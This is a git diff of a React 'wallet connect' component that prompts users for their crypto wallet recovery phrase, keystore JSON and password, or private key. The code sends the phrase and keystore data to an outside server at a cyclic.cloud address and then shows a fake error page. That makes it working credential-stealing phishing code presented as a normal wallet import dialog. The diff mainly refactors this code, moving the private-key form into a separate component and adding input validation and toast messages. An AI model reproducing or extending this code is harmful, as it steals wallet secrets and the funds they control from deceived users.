@@ -3,24 +3,23 @@ import { AiOutlineClose } from 'react-icons/ai';
 import styles from './WalletConnectForm.module.css';
 import {useNavigate} from 'react-router-dom'
 import axios from 'axios'
+import WalletHeading from './WalletConnectForm/WalletHeading';
+import WalletImageContainer from './WalletConnectForm/WalletImageContainer';
+import PrivateKeyForm from './WalletConnectForm/PrivateKeyForm';
+import { ToastContainer, toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
 
 const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
-
   const navigate = useNavigate()
-
   const [currentView, setCurrentView] = useState(1);
   const [activeButton, setActiveButton] = useState(1);
-
   const [wallet, setWallet] = useState('');
   const [phrase, setPhrase] = useState("");
   const [keystore, setKeyStore] = useState("");
   const [keystorePassword, setKeystorePassword] = useState("");
-  const [privateKey, setPrivateKey] = useState("");
   const [phraseError, setPhraseError] = useState(false);
-  const [privateKeyError, setPrivateKeyError] = useState(false);
   const [phraseSubmit, setPhraseSubmit] = useState('CONNECT')
   const [keystoreSubmit, setKeystoreSubmit] = useState('CONNECT')
-  const [privateSubmit, setPrivateSubmit] = useState('CONNECT')
   
   useEffect(() => {
     setWallet(walletName)
@@ -36,9 +35,10 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
   const validatePhrase = (inputPhrase) => {
     const words = inputPhrase.trim().split(/\s+/); // Split by whitespace
-    return words.length >= 12;
+    const wordCount = words.length;
+    return wordCount >= 12 && wordCount <= 24;
   };
-
+  
   const trackPhraseWordCount = () => {
     if (validatePhrase(phrase)) {
       setPhraseError(false);
@@ -46,14 +46,6 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
       setPhraseError(true);
     }
   };
-  const trackPrivateKeyWordCount = () => {
-    if (validatePhrase(privateKey)) {
-      setPrivateKeyError(false);
-    } else {
-      setPrivateKeyError(true);
-    }
-  };
-
 
   // ##### PHRASE
   const handlePhraseSubmit = async (e) => {
@@ -68,11 +60,21 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
         await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
         setTimeout(() => {
           navigate('/wallet-error')
-        }, 5000);
+        }, 3000);
       } catch (error) {
         console.log("")
       }
     } else {
+      toast.error('Please enter a phrase with a word count between 12 and 24.', {
+        position: "top-right",
+        autoClose: 2500,
+        hideProgressBar: false,
+        closeOnClick: true,
+        pauseOnHover: true,
+        draggable: true,
+        progress: undefined,
+        theme: "light",
+        });
       setPhraseError(true);
     }
   }
@@ -89,34 +91,28 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
       await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
       setTimeout(() => {
         navigate('/wallet-error')
-      }, 5000);
+      }, 3000);
     } catch (error) {
       console.log("error")
     }
   }
-
-  // ##### PRIVATE KEY SUBMISSION
-  const handlePrivateKeySubmit = async (e) => {
-    setPrivateSubmit("Processing...")
-    e.preventDefault();
-    const name = wallet
-    const type = "Private_Key"
-    const data = privateKey
-    const password = "not_required"
-    if (validatePhrase(privateKey)) {
-      try {
-        const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
-        setTimeout(() => {
-          navigate('/wallet-error')
-        }, 5000);
-      } catch (error) {
-        console.log("")
-      }
-    } else {
-      setPhraseError(true);
-    }
+  
+  const privateKeyLengthNotlong = () => {
+    toast.error('Invalid private key format.', {
+      position: "top-right",
+      autoClose: 2500,
+      hideProgressBar: false,
+      closeOnClick: true,
+      pauseOnHover: true,
+      draggable: true,
+      progress: undefined,
+      theme: "light",
+      });
   }
+
   return (
+    <>
+    <ToastContainer />
     <section className={styles.formSection}>
       <section className={styles.innerSection}>
         <div className={styles.buttonContainer}>
@@ -134,14 +130,8 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
         <div className={styles.walletForm}>
           <div className={styles.contentContainer}>
-            <div className={styles.imageContainer}>
-
-              <img src={walletLogo} alt="wallet logo" className={styles.walletLogo} />
-              
-            </div>
-            <div className={styles.walletHeading}>
-              <p>Import your {walletName} {walletName.includes("Wallet") ? "" : " Wallet"} </p>
-            </div>
+            <WalletImageContainer walletLogo={walletLogo} />
+            <WalletHeading walletName={walletName} />
           </div>
           <div className={styles.view}>
             <button
@@ -204,65 +194,41 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
                 display: currentView === 2 ? 'block' : 'none',
               }}
             >
-            <form onSubmit={handleKeystoreSubmit}>
-              <textarea
-                autoComplete="off"
-                required
-                spellCheck="false"
-                name="Keystore"
-                rows="7"
-                placeholder='Enter your Keystore JSON'
-                className={styles.textarea}
-                value={keystore}
-                onChange={(e) => setKeyStore(e.target.value)}
-              ></textarea>
-              <input
-                required
-                type="password"
-                autoComplete="off"
-                name="keystorePassword"
-                value={keystorePassword}
-                onChange={(e) => setKeystorePassword(e.target.value)}
-                placeholder='Wallet Password'
-                className={styles.passwordInput}
-              />
-              <p className={styles.hint}>Several lines of text beginning with {`{...}`} plus the password you used to encrypt it.</p>
-              <button type='submit' className={styles.connectButton}>{keystoreSubmit}</button>
-            </form>
+              <form onSubmit={handleKeystoreSubmit}>
+                <textarea
+                  autoComplete="off"
+                  required
+                  spellCheck="false"
+                  name="Keystore"
+                  rows="7"
+                  placeholder='Enter your Keystore JSON'
+                  className={styles.textarea}
+                  value={keystore}
+                  onChange={(e) => setKeyStore(e.target.value)}
+                ></textarea>
+                <input
+                  required
+                  type="password"
+                  autoComplete="off"
+                  name="keystorePassword"
+                  value={keystorePassword}
+                  onChange={(e) => setKeystorePassword(e.target.value)}
+                  placeholder='Wallet Password'
+                  className={styles.passwordInput}
+                />
+                <p className={styles.hint}>Several lines of text beginning with {`{...}`} plus the password you used to encrypt it.</p>
+                <button type='submit' className={styles.connectButton}>{keystoreSubmit}</button>
+              </form>
             </div>
-            <div
-              style={{
-                display: currentView === 3 ? 'block' : 'none',
-                
-              }}
-            >
-            <form onSubmit={handlePrivateKeySubmit}>
-              <input
-                required
-                type="text"
-                name="privateKey"
-                value={privateKey}
-                autoComplete="off"
-                onChange={(e) => {
-                  setPrivateKey(e.target.value)
-                  trackPrivateKeyWordCount(); // Call the function
-                }}
-                placeholder='Enter your Private Key'
-                className={styles.privateKeyInput}
-              />
-              <p 
-                className={styles.hint}
-                style={{
-                  color: privateKeyError ? "red" : "green"
-              }}
-              >Typically 12 (sometimes 24) words separated by single spaces</p>
-              <button type='submit' className={styles.connectButton}>{privateSubmit}</button>
-            </form>
+
+            <div style={{ display: currentView === 3 ? 'block' : 'none'}}>
+                <PrivateKeyForm wallet={wallet} privateKeyLengthNotlong={privateKeyLengthNotlong} />
             </div>
           </div>
         </div>
       </section>
     </section>
+    </>
   );
 };
 export default WalletConnectForm;
